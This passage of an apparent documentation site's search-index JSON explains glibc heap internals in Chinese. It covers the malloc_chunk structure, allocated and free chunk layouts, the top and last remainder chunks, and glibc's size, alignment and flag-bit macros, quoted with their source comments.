segment\u4e0earena\u5173\u7cfb"},{"location":"glibc-heap/heap_structure/#_4","text":"","title":"\u5fae\u89c2\u7ed3\u6784"},{"location":"glibc-heap/heap_structure/#chunk","text":"","title":"chunk \u4ecb\u7ecd"},{"location":"glibc-heap/heap_structure/#_5","text":"\u5728 glibc malloc \u4e2d\u5c06\u6574\u4e2a\u5806\u5185\u5b58\u7a7a\u95f4\u5206\u6210\u4e86\u8fde\u7eed\u7684\u3001\u5927\u5c0f\u4e0d\u4e00\u7684 chunk \uff0c\u5373\u5bf9\u4e8e\u5806\u5185\u5b58\u7ba1\u7406\u800c\u8a00 chunk \u5c31\u662f\u6700\u5c0f\u64cd\u4f5c\u5355\u4f4d\u3002 chunk \u603b\u5171\u5206\u4e3a 4 \u5927\u7c7b\uff1a allocated chunk free chunk top chunk last remainder chunk \u4ece\u672c\u8d28\u4e0a\u6765\u8bf4\uff0c\u6240\u6709\u7c7b\u578b\u7684 chunk \u90fd\u662f\u5185\u5b58\u4e2d\u4e00\u5757\u8fde\u7eed\u7684\u533a\u57df\uff0c\u53ea\u662f\u901a\u8fc7\u8be5\u533a\u57df\u4e2d\u7279\u5b9a\u4f4d\u7f6e\u7684\u67d0\u4e9b\u6807\u8bc6\u7b26\u52a0\u4ee5\u533a\u5206\u3002\u4e3a\u4e86\u7b80\u4fbf\uff0c\u4e5f\u53ef\u4ee5\u5c06\u8fd9 4 \u5927\u7c7b chunk \u7b80\u5316\u4e3a 2 \u7c7b\uff1a allocated chunk \u4ee5\u53ca free chunk \uff0c\u524d\u8005\u8868\u793a\u5df2\u7ecf\u5206\u914d\u7ed9\u7528\u6237\u4f7f\u7528\u7684 chunk \uff0c\u540e\u8005\u8868\u793a\u672a\u4f7f\u7528\u7684 chunk \u3002 \u4efb\u4f55\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u662f\u4ee5 chunk \u4e3a\u5355\u4f4d\u8fdb\u884c\u5806\u5185\u5b58\u7ba1\u7406\u7684\uff0c\u800c\u8fd9\u5c31\u9700\u8981\u4e00\u4e9b\u6570\u636e\u7ed3\u6784\u6765\u6807\u5fd7\u5404\u4e2a\u5757\u7684\u8fb9\u754c\uff0c\u4ee5\u53ca\u533a\u5206\u5df2\u5206\u914d\u5757\u548c\u7a7a\u95f2\u5757\u3002\u5927\u591a\u6570\u5806\u5185\u5b58\u7ba1\u7406\u5668\u90fd\u5c06\u8fd9\u4e9b\u8fb9\u754c\u4fe1\u606f\u4f5c\u4e3a chunk \u7684\u4e00\u90e8\u5206\u5d4c\u5165\u5230 chunk \u5185\u90e8\u3002 \u65e0\u8bba\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u5982\u4f55\uff0c\u5904\u4e8e\u5206\u914d\u72b6\u6001\u8fd8\u662f\u91ca\u653e\u72b6\u6001\uff0c\u5b83\u4eec\u90fd\u4f7f\u7528\u4e00\u4e2a\u7edf\u4e00\u7684\u7ed3\u6784\uff08malloc_chunk\uff09\u3002\u867d\u7136\u5b83\u4eec\u4f7f\u7528\u4e86\u540c\u4e00\u4e2a\u6570\u636e\u7ed3\u6784\uff0c\u4f46\u662f\u6839\u636e\u662f\u5426\u88ab\u91ca\u653e\uff0c\u5b83\u4eec\u7684\u8868\u73b0\u5f62\u5f0f\u4f1a\u6709\u6240\u4e0d\u540c\u3002","title":"\u6982\u8ff0"},{"location":"glibc-heap/heap_structure/#malloc_chunk-allocated-chunk","text":"malloc_chunk \u7684\u7ed3\u6784\u5982\u4e0b: /* This struct declaration is misleading (but accurate and necessary). It declares a \"view\" into memory allowing access to necessary fields at known offsets from a given base. See explanation below. */ struct malloc_chunk { INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free). */ INTERNAL_SIZE_T size; /* Size in bytes, including overhead. */ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; }; \u4e00\u822c\u6765\u8bf4\uff0csize_t \u5728 64 \u4f4d\u4e2d\u662f 64 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\uff0c32 \u4f4d\u4e2d\u662f 32 \u4f4d\u65e0\u7b26\u53f7\u6574\u6570\u3002 \u6bcf\u4e2a\u5b57\u6bb5\u7684\u5177\u4f53\u7684\u89e3\u91ca\u5982\u4e0b prev_size \u5982\u679c\u8be5 chunk \u7684 \u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u5730\u5740 chunk\uff08\u4e24\u4e2a\u6307\u9488\u7684\u5730\u5740\u5dee\u503c\u4e3a\u524d\u4e00 chunk \u5927\u5c0f\uff09 \u662f\u7a7a\u95f2\u7684\u8bdd\uff0c\u90a3\u8be5\u5b57\u6bb5\u8bb0\u5f55\u7684\u662f\u524d\u4e00\u4e2a chunk \u7684\u5927\u5c0f (\u5305\u62ec chunk \u5934)\u3002\u5426\u5219\uff0c\u8be5\u5b57\u6bb5\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u7269\u7406\u76f8\u90bb\u7684\u524d\u4e00\u4e2a chunk \u7684\u6570\u636e\u3002 \u8fd9\u91cc\u7684\u524d\u4e00 chunk \u6307\u7684\u662f\u8f83\u4f4e\u5730\u5740\u7684 chunk \u3002 size \u8be5 chunk \u7684\u5927\u5c0f\uff0c\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\u3002\u5982\u679c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e0d\u662f 2 * SIZE_SZ \u7684\u6574\u6570\u500d\uff0c\u4f1a\u88ab\u8f6c\u6362\u6ee1\u8db3\u5927\u5c0f\u7684\u6700\u5c0f\u7684 2 * SIZE_SZ \u7684\u500d\u6570\u300232 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 4\uff1b64 \u4f4d\u7cfb\u7edf\u4e2d\uff0cSIZE_SZ \u662f 8\u3002 \u8be5\u5b57\u6bb5\u7684\u4f4e\u4e09\u4e2a\u6bd4\u7279\u4f4d\u5bf9 chunk \u7684\u5927\u5c0f\u6ca1\u6709\u5f71\u54cd\uff0c\u5b83\u4eec\u4ece\u9ad8\u5230\u4f4e\u5206\u522b\u8868\u793a NON_MAIN_ARENA\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u4e0d\u5c5e\u4e8e\u4e3b\u7ebf\u7a0b\uff0c1 \u8868\u793a\u4e0d\u5c5e\u4e8e\uff0c0 \u8868\u793a\u5c5e\u4e8e\u3002 IS_MAPPED\uff0c\u8bb0\u5f55\u5f53\u524d chunk \u662f\u5426\u662f\u7531 mmap \u5206\u914d\u7684\u3002 PREV_INUSE\uff0c\u8bb0\u5f55\u524d\u4e00\u4e2a chunk \u5757\u662f\u5426\u88ab\u5206\u914d\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u5806\u4e2d\u7b2c\u4e00\u4e2a\u88ab\u5206\u914d\u7684\u5185\u5b58\u5757\u7684 size \u5b57\u6bb5\u7684 P \u4f4d\u90fd\u4f1a\u88ab\u8bbe\u7f6e\u4e3a 1\uff0c\u4ee5\u4fbf\u4e8e\u9632\u6b62\u8bbf\u95ee\u524d\u9762\u7684\u975e\u6cd5\u5185\u5b58\u3002\u5f53\u4e00\u4e2a chunk \u7684 size \u7684 P \u4f4d\u4e3a 0 \u65f6\uff0c\u6211\u4eec\u80fd\u901a\u8fc7 prev_size \u5b57\u6bb5\u6765\u83b7\u53d6\u4e0a\u4e00\u4e2a chunk \u7684\u5927\u5c0f\u4ee5\u53ca\u5730\u5740\u3002\u8fd9\u4e5f\u65b9\u4fbf\u8fdb\u884c\u7a7a\u95f2 chunk \u4e4b\u95f4\u7684\u5408\u5e76\u3002 fd\uff0cbk chunk \u5904\u4e8e\u5206\u914d\u72b6\u6001\u65f6\uff0c\u4ece fd \u5b57\u6bb5\u5f00\u59cb\u662f\u7528\u6237\u7684\u6570\u636e\u3002chunk \u7a7a\u95f2\u65f6\uff0c\u4f1a\u88ab\u6dfb\u52a0\u5230\u5bf9\u5e94\u7684\u7a7a\u95f2\u7ba1\u7406\u94fe\u8868\u4e2d\uff0c\u5176\u5b57\u6bb5\u7684\u542b\u4e49\u5982\u4e0b fd \u6307\u5411\u4e0b\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk bk \u6307\u5411\u4e0a\u4e00\u4e2a\uff08\u975e\u7269\u7406\u76f8\u90bb\uff09\u7a7a\u95f2\u7684 chunk \u901a\u8fc7 fd \u548c bk \u53ef\u4ee5\u5c06\u7a7a\u95f2\u7684 chunk \u5757\u52a0\u5165\u5230\u7a7a\u95f2\u7684 chunk \u5757\u94fe\u8868\u8fdb\u884c\u7edf\u4e00\u7ba1\u7406 fd_nextsize\uff0c bk_nextsize \u4e5f\u662f\u53ea\u6709 chunk \u7a7a\u95f2\u7684\u65f6\u5019\u624d\u4f7f\u7528\uff0c\u4e0d\u8fc7\u5176\u7528\u4e8e\u8f83\u5927\u7684 chunk\uff08large chunk\uff09\u3002 fd_nextsize \u6307\u5411\u524d\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 bk_nextsize \u6307\u5411\u540e\u4e00\u4e2a\u4e0e\u5f53\u524d chunk \u5927\u5c0f\u4e0d\u540c\u7684\u7b2c\u4e00\u4e2a\u7a7a\u95f2\u5757\uff0c\u4e0d\u5305\u542b bin \u7684\u5934\u6307\u9488\u3002 \u4e00\u822c\u7a7a\u95f2\u7684 large chunk \u5728 fd \u7684\u904d\u5386\u987a\u5e8f\u4e2d\uff0c\u6309\u7167\u7531\u5927\u5230\u5c0f\u7684\u987a\u5e8f\u6392\u5217\u3002 \u8fd9\u6837\u505a\u53ef\u4ee5\u907f\u514d\u5728\u5bfb\u627e\u5408\u9002 chunk \u65f6\u6328\u4e2a\u904d\u5386\u3002 \u4e00\u4e2a\u5df2\u7ecf\u5206\u914d\u7684 chunk \u7684\u6837\u5b50\u5982\u4e0b\u3002 \u6211\u4eec\u79f0\u524d\u4e24\u4e2a\u5b57\u6bb5\u79f0\u4e3a chunk header\uff0c\u540e\u9762\u7684\u90e8\u5206\u79f0\u4e3a user data\u3002\u6bcf\u6b21 malloc \u7533\u8bf7\u5f97\u5230\u7684\u5185\u5b58\u6307\u9488\uff0c\u5176\u5b9e\u6307\u5411 user data \u7684\u8d77\u59cb\u5904\u3002 \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u4f7f\u7528\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u57df\u65e0\u6548\uff0c\u6240\u4ee5\u4e0b\u4e00\u4e2a chunk \u7684\u8be5\u90e8\u5206\u4e5f\u53ef\u4ee5\u88ab\u5f53\u524d chunk \u4f7f\u7528\u3002 \u8fd9\u5c31\u662f chunk \u4e2d\u7684\u7a7a\u95f4\u590d\u7528\u3002 \u5df2\u7ecf\u88ab\u5206\u914d\u4f7f\u7528\u7684 chunk \u7ed3\u6784\u5982\u4e0b\u4e24\u4e2a\u56fe\uff1a\uff08\u56fe\u4e00\u56fe\u4e8c size \u4f4d A \u4e0e N \u76f8\u540c\u542b\u4e49\u53ea\u662f\u8868\u793a\u4e0d\u540c\uff09 chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of chunk, in bytes |A|M|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | User data starts here... . . . . (malloc_usable_size() bytes) . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | (size of chunk, but used for application data) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|1| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+","title":"malloc_chunk (allocated chunk)"},{"location":"glibc-heap/heap_structure/#free_chunk","text":"\u88ab\u91ca\u653e\u7684 chunk \u88ab\u8bb0\u5f55\u5728\u94fe\u8868\u4e2d\uff08\u53ef\u80fd\u662f\u5faa\u73af\u53cc\u5411\u94fe\u8868\uff0c\u4e5f\u53ef\u80fd\u662f\u5355\u5411\u94fe\u8868\uff09\u3002\u5177\u4f53\u7ed3\u6784\u5982\u4e0b\uff1a chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of previous chunk, if unallocated (P clear) | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `head:' | Size of chunk, in bytes |A|0|P| mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Forward pointer to next chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Back pointer to previous chunk in list | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Unused space (may be 0 bytes long) . . . next . | chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ `foot:' | Size of chunk, in bytes | +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | Size of next chunk, in bytes |A|0|0| +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ \u53ef\u4ee5\u53d1\u73b0\uff0c\u5982\u679c\u4e00\u4e2a chunk \u5904\u4e8e free \u72b6\u6001\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u4e2a\u4f4d\u7f6e\u8bb0\u5f55\u5176\u76f8\u5e94\u7684\u5927\u5c0f \u672c\u8eab\u7684 size \u5b57\u6bb5\u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u6700\u540e\u4e00\u884c size \u4f4d\uff09 \u5b83\u540e\u9762\u7684 chunk \u4f1a\u8bb0\u5f55\u3002\uff08\u56fe\u4e2d\u5012\u6570\u7b2c\u4e8c\u884c nextchunk \u7684 prevsize \u4f4d\uff09 \u4e00\u822c\u60c5\u51b5\u4e0b \uff08fastbin\u4e2d\u5b58\u5728\u7279\u4f8b\uff09\uff0c\u7269\u7406\u76f8\u90bb\u7684\u4e24\u4e2a\u7a7a\u95f2 chunk \u4f1a\u88ab\u5408\u5e76\u4e3a\u4e00\u4e2a chunk \u3002\u5806\u7ba1\u7406\u5668\u4f1a\u901a\u8fc7 prev_size \u5b57\u6bb5\u4ee5\u53ca size \u5b57\u6bb5\u5408\u5e76\u4e24\u4e2a\u7269\u7406\u76f8\u90bb\u7684\u7a7a\u95f2 chunk \u5757\u3002 \uff01\uff01\uff01\u4e00\u4e9b\u5173\u4e8e\u5806\u7684\u7ea6\u675f\uff0c\u540e\u9762\u8be6\u7ec6\u8003\u8651\uff01\uff01\uff01 /* The three exceptions to all this are: 1. The special chunk `top' doesn't bother using the trailing size field since there is no next contiguous chunk that would have to index off it. After initialization, `top' is forced to always exist. If it would become less than MINSIZE bytes long, it is replenished. 2. Chunks allocated via mmap, which have the second-lowest-order bit M (IS_MMAPPED) set in their size fields. Because they are allocated one-by-one, each must contain its own trailing size field. If the M bit is set, the other bits are ignored (because mmapped chunks are neither in an arena, nor adjacent to a freed chunk). The M bit is also used for chunks which originally came from a dumped heap via malloc_set_state in hooks.c. 3. Chunks in fastbins are treated as allocated chunks from the point of view of the chunk allocator. They are consolidated with their neighbors only in bulk, in malloc_consolidate. */","title":"free_chunk"},{"location":"glibc-heap/heap_structure/#top-chunk","text":"glibc \u4e2d\u5bf9\u4e8e top chunk \u7684\u63cf\u8ff0\u5982\u4e0b /* Top The top-most available chunk (i.e., the one bordering the end of available memory) is treated specially. It is never included in any bin, is used only if no other chunk is available, and is released back to the system if it is very large (see M_TRIM_THRESHOLD). Because top initially points to its own bin with initial zero size, thus forcing extension on the first malloc request, we avoid having any special code in malloc to check whether it even exists yet. But we still need to do so when getting memory from system, so we make initial_top treat the bin as a legal but unusable chunk during the interval between initialization and the first call to sysmalloc. (This is somewhat delicate, since it relies on the 2 preceding words to be zero during this interval as well.) */ /* Conveniently, the unsorted bin can be used as dummy top on first call */ #define initial_top(M) (unsorted_chunks(M)) \u7a0b\u5e8f\u7b2c\u4e00\u6b21\u8fdb\u884c malloc \u7684\u65f6\u5019\uff0cheap \u4f1a\u88ab\u5206\u4e3a\u4e24\u5757\uff0c\u4e00\u5757\u7ed9\u7528\u6237\uff0c\u5269\u4e0b\u7684\u90a3\u5757\u5c31\u662f top chunk\u3002\u5176\u5b9e\uff0c\u6240\u8c13\u7684 top chunk \u5c31\u662f\u5904\u4e8e\u5f53\u524d\u5806\u7684\u7269\u7406\u5730\u5740\u6700\u9ad8\u7684 chunk\u3002 top chunk \u4e0d\u5c5e\u4e8e\u4efb\u4f55\u4e00\u4e2a bin \uff0c\u5b83\u7684\u4f5c\u7528\u5728\u4e8e\u5f53\u6240\u6709\u7684 bin \u90fd\u65e0\u6cd5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\u65f6\uff0c\u5982\u679c top chunk \u5927\u5c0f\u4e0d\u5c0f\u4e8e\u7528\u6237\u8bf7\u6c42\u7684\u5927\u5c0f\uff0c\u5c31\u5c06\u8be5 top chunk \u5206\u4f5c\u4e24\u90e8\u5206\uff1a\u7528\u6237\u8bf7\u6c42\u7684 chunk \u548c \u5269\u4f59\u7684\u90e8\u5206\uff08\u6210\u4e3a\u65b0\u7684 top chunk \uff09\u3002\u5426\u5219\uff0c\u5c31\u5bf9 heap \u8fdb\u884c\u6269\u5c55\u540e\u518d\u8fdb\u884c\u5206\u914d\u3002\u5728 main arena \u4e2d\u901a\u8fc7 sbrk \u6269\u5c55 heap \uff0c\u800c\u5728 thread arena \u4e2d\u901a\u8fc7 mmap \u5206\u914d\u65b0\u7684 heap \u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0ctop chunk \u7684 prev_inuse \u6bd4\u7279\u4f4d\u59cb\u7ec8\u4e3a 1\uff0c\u5426\u5219\u5176\u524d\u9762\u7684 chunk \u5c31\u4f1a\u88ab\u5408\u5e76\u5230 top chunk \u4e2d\u3002 \u521d\u59cb\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06 unsorted chunk \u4f5c\u4e3a top chunk\u3002","title":"top chunk"},{"location":"glibc-heap/heap_structure/#last-remainder","text":"\u5728\u7528\u6237\u4f7f\u7528 malloc \u8bf7\u6c42\u5206\u914d\u5185\u5b58\u65f6\uff0cptmalloc2 \u627e\u5230\u7684 chunk \uff08bin\u4e2d\u7684chunk\uff09\u53ef\u80fd\u5e76\u4e0d\u548c\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u4e00\u81f4\uff0c\u8fd9\u65f6\u5019\u5c31\u5c06\u5206\u5272\u4e4b\u540e\u7684\u5269\u4f59\u90e8\u5206\u79f0\u4e4b\u4e3a last remainder chunk \uff0cunsort bin \u4e5f\u4f1a\u5b58\u8fd9\u4e00\u5757\u3002top chunk \u5206\u5272\u5269\u4e0b\u7684\u90e8\u5206\u4e0d\u4f1a\u4f5c\u4e3a last remainder\u3002","title":"last remainder"},{"location":"glibc-heap/heap_structure/#chunk_1","text":"\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd chunk \u7684\u5927\u5c0f\u3001\u5bf9\u9f50\u68c0\u67e5\u4ee5\u53ca\u4e00\u4e9b\u8f6c\u6362\u7684\u5b8f\u3002 chunk \u4e0e mem \u6307\u9488\u5934\u90e8\u7684\u8f6c\u6362 mem \u6307\u5411\u7528\u6237\u5f97\u5230\u7684\u5185\u5b58\u7684\u8d77\u59cb\u4f4d\u7f6e\u3002 /* conversion from malloc headers to user pointers, and back */ #define chunk2mem(p) ((void *) ((char *) (p) + 2 * SIZE_SZ)) #define mem2chunk(mem) ((mchunkptr)((char *) (mem) -2 * SIZE_SZ)) \u6700\u5c0f\u7684 chunk \u5927\u5c0f /* The smallest possible chunk */ #define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize)) \u8fd9\u91cc\uff0coffsetof \u51fd\u6570\u8ba1\u7b97\u51fa fd_nextsize \u5728 malloc_chunk \u4e2d\u7684\u504f\u79fb\uff0c\u8bf4\u660e\u6700\u5c0f\u7684 chunk \u81f3\u5c11\u8981\u5305\u542b bk \u6307\u9488\u3002 \u6700\u5c0f\u7533\u8bf7\u7684\u5806\u5185\u5b58\u5927\u5c0f \u7528\u6237\u6700\u5c0f\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u5fc5\u987b\u662f 2 * SIZE_SZ \u7684\u6700\u5c0f\u6574\u6570\u500d\u3002 \u6ce8\uff1a\u5c31\u76ee\u524d\u800c\u770b MIN_CHUNK_SIZE \u548c MINSIZE \u5927\u5c0f\u662f\u4e00\u81f4\u7684\uff0c\u4e2a\u4eba\u8ba4\u4e3a\u4e4b\u6240\u4ee5\u8981\u6dfb\u52a0\u4e24\u4e2a\u5b8f\u662f\u4e3a\u4e86\u65b9\u4fbf\u4ee5\u540e\u4fee\u6539 malloc_chunk \u65f6\u65b9\u4fbf\u4e00\u4e9b\u3002 /* The smallest size we can malloc is an aligned minimal chunk */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define MINSIZE \\ (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) & \\ ~MALLOC_ALIGN_MASK)) \u68c0\u67e5\u5206\u914d\u7ed9\u7528\u6237\u7684\u5185\u5b58\u662f\u5426\u5bf9\u9f50 2 * SIZE_SZ \u5927\u5c0f\u5bf9\u9f50\u3002 /* Check if m has acceptable alignment */ // MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define aligned_OK(m) (((unsigned long) (m) & MALLOC_ALIGN_MASK) == 0) #define misaligned_chunk(p) \\ ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) & \\ MALLOC_ALIGN_MASK) \u8bf7\u6c42\u5b57\u8282\u6570\u5224\u65ad /* Check if a request is so large that it would wrap around zero when padded and aligned. To simplify some other code, the bound is made low enough so that adding MINSIZE will also not wrap around zero. */ #define REQUEST_OUT_OF_RANGE(req) \\ ((unsigned long) (req) >= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE)) \u5c06\u7528\u6237\u8bf7\u6c42\u5185\u5b58\u5927\u5c0f\u8f6c\u4e3a\u5b9e\u9645\u5206\u914d\u5185\u5b58\u5927\u5c0f /* pad request bytes into a usable size -- internal version */ //MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1 #define request2size(req) \\ (((req) + SIZE_SZ + MALLOC_ALIGN_MASK < MINSIZE) \\ ? MINSIZE \\ : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) & ~MALLOC_ALIGN_MASK) /* Same, except also perform argument check */ #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE(req)) { \\ __set_errno(ENOMEM); \\ return 0; \\ } \\ (sz) = request2size(req); \u5f53\u4e00\u4e2a chunk \u5904\u4e8e\u5df2\u5206\u914d\u72b6\u6001\u65f6\uff0c\u5b83\u7684\u7269\u7406\u76f8\u90bb\u7684\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u5fc5\u7136\u662f\u65e0\u6548\u7684\uff0c\u6545\u800c\u8fd9\u4e2a\u5b57\u6bb5\u5c31\u53ef\u4ee5\u88ab\u5f53\u524d\u8fd9\u4e2a chunk \u4f7f\u7528\u3002\u8fd9\u5c31\u662f ptmalloc \u4e2d chunk \u95f4\u7684\u590d\u7528\u3002\u5177\u4f53\u6d41\u7a0b\u5982\u4e0b \u9996\u5148\uff0c\u5229\u7528 REQUEST_OUT_OF_RANGE \u5224\u65ad\u662f\u5426\u53ef\u4ee5\u5206\u914d\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u5927\u5c0f\u7684 chunk\u3002 \u5176\u6b21\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u7528\u6237\u8bf7\u6c42\u7684\u5b57\u8282\u662f\u7528\u6765\u5b58\u50a8\u6570\u636e\u7684\uff0c\u5373 chunk header \u540e\u9762\u7684\u90e8\u5206\u3002\u4e0e\u6b64\u540c\u65f6\uff0c\u7531\u4e8e chunk \u95f4\u590d\u7528\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u4e0b\u4e00\u4e2a chunk \u7684 prev_size \u5b57\u6bb5\u3002\u56e0\u6b64\uff0c\u8fd9\u91cc\u53ea\u9700\u8981\u518d\u6dfb\u52a0 SIZE_SZ \u5927\u5c0f\u5373\u53ef\u4ee5\u5b8c\u5168\u5b58\u50a8\u5185\u5bb9\u3002 \u7531\u4e8e\u7cfb\u7edf\u4e2d\u6240\u5141\u8bb8\u7684\u7533\u8bf7\u7684 chunk \u6700\u5c0f\u662f MINSIZE\uff0c\u6240\u4ee5\u4e0e\u5176\u8fdb\u884c\u6bd4\u8f83\u3002\u5982\u679c\u4e0d\u6ee1\u8db3\u6700\u4f4e\u8981\u6c42\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u76f4\u63a5\u5206\u914d MINSIZE \u5b57\u8282\u3002 \u5982\u679c\u5927\u4e8e\u7684\u8bdd\uff0c\u56e0\u4e3a\u7cfb\u7edf\u4e2d\u7533\u8bf7\u7684 chunk \u9700\u8981 2 * SIZE_SZ \u5bf9\u9f50\uff0c\u6240\u4ee5\u8fd9\u91cc\u9700\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK \u4ee5\u4fbf\u4e8e\u5bf9\u9f50\u3002 \u4e2a\u4eba\u8ba4\u4e3a\uff0c\u8fd9\u91cc\u5728 request2size \u7684\u5b8f\u7684\u7b2c\u4e00\u884c\u4e2d\u6ca1\u6709\u5fc5\u8981\u52a0\u4e0a MALLOC_ALIGN_MASK\u3002 \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u901a\u8fc7\u8fd9\u6837\u7684\u8ba1\u7b97\u516c\u5f0f\u5f97\u5230\u7684 size \u6700\u7ec8\u4e00\u5b9a\u662f\u6ee1\u8db3\u7528\u6237\u9700\u8981\u7684\u3002 \u6807\u8bb0\u4f4d\u76f8\u5173 /* size field is or'ed with PREV_INUSE when previous adjacent chunk in use */ #define PREV_INUSE 0x1 /* extract inuse bit of previous chunk */ #define prev_inuse(p) ((p)->mchunk_size & PREV_INUSE) /* size field is or'ed with IS_MMAPPED if the chunk was obtained with mmap() */ #define IS_MMAPPED 0x2 /* check for mmap()'ed chunk */ #define chunk_is_mmapped(p) ((p)->mchunk_size & IS_MMAPPED) /* size field is or'ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena. This is only set immediately before handing the chunk to the user, if necessary. */ #define NON_MAIN_ARENA 0x4 /* Check for chunk from main arena. */ #define chunk_main_arena(p) (((p)->mchunk_size & NON_MAIN_ARENA) == 0) /* Mark a chunk as not being on the main arena. */ #define set_non_main_arena(p) ((p)->mchunk_size |= NON_MAIN_ARENA) /* Bits to mask off when extracting size Note: IS_MMAPPED is intentionally not masked off from size field in macros for which mmapped chunks should never be seen. This should cause helpful core dumps to occur if it is tried by accident by people extending or adapting this malloc. */ #define SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) \u83b7\u53d6 chunk size /* Get size, ignoring use bits */ #define chunksize(p) (chunksize_nomask(p) & ~(SIZE_BITS)) /* Like chunksize, but do not mask SIZE_BITS. */ #define chunksize_nomask(p) ((p)->mchunk_size) \u83b7\u53d6\u4e0b\u4e00\u4e2a\u7269\u7406\u76f8\u90bb\u7684 chunk /* Ptr to next physical malloc_chunk. */ #define next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p))) \u83b7\u53d6\u524d\u4e00\u4e2a chunk \u7684\u4fe1\u606f /* Size of the chunk below P. Only valid if !prev_inuse (P). */ #define prev_size(p) ((p)->mchunk_prev_size) /* Set the size of the chunk below P. Only valid if !prev_inuse (P). */ #define set_prev_size(p, sz) ((p)->mchunk_prev_size = (sz)) /* Ptr to previous physical malloc_chunk. Only valid if !prev_inuse (P). */ #define prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p))) \u5f53\u524d chunk \u4f7f\u7528\u72b6\u6001\u76f8\u5173\u64cd\u4f5c /* extract p's inuse bit */ #define inuse(p) \\ ((((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size) & PREV_INUSE) /* set/clear chunk as being inuse without otherwise disturbing */ #define set_inuse(p) \\ ((mchunkptr)(((char *) (p)) + chunksize(p)))->mchunk_size |= PREV_INUSE #define clear_inuse(p) \\ ((mchunkptr)(((char *) (p)) + 